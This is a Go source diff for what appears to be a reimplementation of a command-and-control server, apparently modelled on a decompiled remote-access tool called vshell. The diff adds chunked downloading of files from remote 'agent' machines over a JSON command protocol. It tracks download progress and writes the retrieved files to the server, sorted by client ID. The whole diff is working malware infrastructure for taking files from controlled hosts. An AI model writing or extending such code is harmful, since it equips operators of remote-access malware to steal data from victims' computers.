@@ -28,6 +28,7 @@ import (
 	"encoding/json"
 	"io"
 	"log"
+	"os"
 	"path/filepath"
 	"sort"
 	"net/http"
@@ -35,7 +36,6 @@ import (
 	"strings"
 	"time"
 
-	"vshell/c2engine"
 )
 
 // FileController 管理客户端文件系统。
@@ -380,40 +380,9 @@ func (c *FileController) DownloadToBrowser() {
 		remote = target
 	}
 
-	// 下发 JSON 命令让 agent 读文件并回 base64（agent 的 CmdDownload 分支），
-	// 拿到结果后以附件形式输出——原版同样是"agent 回传 base64 → 服务器落附件"。
-	cmd, _ := json.Marshal(map[string]string{"type": "download", "path": remote})
-	task, err := dispatchCmd(id, string(cmd))
-	if err != nil {
-		c.JsonErr(err.Error())
-		return
-	}
-	if task == 0 {
-		c.JsonErr("download failed")
-		return
-	}
-
-	// 小文件同步等待（20s）：大文件应走 downloadtoserver + getdownloadper 的
-	// 分块路径（尚未实现，见 docs/STATUS.md）。
-	t := c2engine.GetEngine().GetTask(task)
-	deadline := time.Now().Add(20 * time.Second)
-	for time.Now().Before(deadline) {
-		if t == nil {
-			break
-		}
-		if t.Status != "pending" && t.Status != "dispatched" {
-			break
-		}
-		time.Sleep(100 * time.Millisecond)
-		t = c2engine.GetEngine().GetTask(task)
-	}
-	if t == nil || t.Status != "completed" {
-		c.JsonErr("download timeout")
-		return
-	}
-	data, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(t.Result))
-	if derr != nil {
-		c.JsonErr("agent returned invalid data: " + t.Result)
+	data, errMsg := engineDownloadFile(id, remote)
+	if errMsg != "" {
+		c.JsonErr(errMsg)
 		return
 	}
 
@@ -612,14 +581,109 @@ func engineRunCmd(id int64, cmd string, timeout time.Duration) (string, string) 
 // 复刻端只投递首个整文件下载任务并登记任务条目；分块续传（offset）与
 // "该任务是否停留在客户端记录上"未对齐，见 GetDownloadPer。
 func engineDownloadToServer(id int64, remotePath, target string) int64 {
-	// 反编译 0x18e8700：FUN_0044a940(0, path, len(path), "/", 1, target, len(target))
 	full := joinPath(remotePath, target)
-	taskID := int64(len(downloadTasks) + 1)
-	downloadTasks[taskID] = &DownloadTask{ID: taskID, ClientID: id, Path: full}
-	// 首块（offset 0）随任务建立一起下发；后续分块与进度回填未对齐，
-	// 面板的进度轮询因此读到的 Current 仍为 0（见 GetDownloadPer）。
-	if _, errMsg := engineRunCmd(id, "download "+full, lsCmdTimeout); errMsg != "" {
-		log.Printf("[file] download %s: %s", full, errMsg)
-	}
+	taskID := registerDownloadTask(id, full)
+
+	// 分块拉取并落盘到服务器 downloads/<clientID>/<文件名>，进度写回登记表。
+	go func() {
+		data, errMsg := engineDownloadFileTracked(id, full, taskID)
+		if errMsg != "" {
+			log.Printf("[file] download %s failed: %s", full, errMsg)
+			return
+		}
+		dir := filepath.Join("downloads", strconv.FormatInt(id, 10))
+		if err := os.MkdirAll(dir, 0o755); err != nil {
+			log.Printf("[file] mkdir %s: %v", dir, err)
+			return
+		}
+		name := filepath.Base(full)
+		if name == "" || name == "." || name == "/" {
+			name = "download.bin"
+		}
+		if err := os.WriteFile(filepath.Join(dir, name), data, 0o644); err != nil {
+			log.Printf("[file] write %s: %v", name, err)
+		}
+	}()
 	return taskID
 }
+
+// downloadChunkSize 是单次分块下载的字节数（与反编译里的 1 MiB 步进一致）。
+const downloadChunkSize = 1 << 20
+
+// maxDownloadBytes 是单文件下载上限，避免把服务器内存打满。
+const maxDownloadBytes = 128 << 20
+
+// registerDownloadTask 登记一条下载进度记录。
+func registerDownloadTask(clientID int64, path string) int64 {
+	downloadTaskMu.Lock()
+	defer downloadTaskMu.Unlock()
+	downloadTaskSeq++
+	id := downloadTaskSeq
+	downloadTasks[id] = &DownloadTask{ID: id, ClientID: clientID, Path: path}
+	return id
+}
+
+// engineDownloadFile 分块拉取远端文件内容（只读，不落盘）。
+func engineDownloadFile(clientID int64, remotePath string) ([]byte, string) {
+	return engineDownloadFileTracked(clientID, remotePath, 0)
+}
+
+// engineDownloadFileTracked 分块拉取远端文件，并把进度写回 taskID 对应的登记项
+// （taskID=0 表示不登记进度）。
+//
+// 与 agent 的约定：
+//
+//	请求 {"type":"download","path":...,"offset":N,"length":M}
+//	响应 "chunk:<total>:<base64>"（分块）或裸 base64（旧 agent，整文件）
+func engineDownloadFileTracked(clientID int64, remotePath string, taskID int64) ([]byte, string) {
+	var out []byte
+	offset := int64(0)
+	for {
+		req, _ := json.Marshal(map[string]interface{}{
+			"type":   "download",
+			"path":   remotePath,
+			"offset": offset,
+			"length": downloadChunkSize,
+		})
+		res, errMsg := engineRunCmd(clientID, string(req), lsCmdTimeout)
+		if errMsg != "" {
+			return nil, errMsg
+		}
+		res = strings.TrimSpace(res)
+
+		if !strings.HasPrefix(res, "chunk:") {
+			// 旧 agent / 小文件路径：整文件 base64。
+			data, derr := base64.StdEncoding.DecodeString(res)
+			if derr != nil {
+				return nil, "agent returned invalid data"
+			}
+			if taskID != 0 {
+				updateDownloadProgress(taskID, int64(len(data)), int64(len(data)))
+			}
+			return data, ""
+		}
+
+		parts := strings.SplitN(strings.TrimPrefix(res, "chunk:"), ":", 2)
+		if len(parts) != 2 {
+			return nil, "malformed chunk response"
+		}
+		total, _ := strconv.ParseInt(parts[0], 10, 64)
+		chunk, derr := base64.StdEncoding.DecodeString(parts[1])
+		if derr != nil {
+			return nil, "invalid chunk encoding"
+		}
+		out = append(out, chunk...)
+		if int64(len(out)) > maxDownloadBytes {
+			return nil, "file too large"
+		}
+		if taskID != 0 {
+			updateDownloadProgress(taskID, total, int64(len(out)))
+		}
+		if len(chunk) == 0 || int64(len(out)) >= total {
+			break
+		}
+		offset += int64(len(chunk))
+	}
+	return out, ""
+}
+
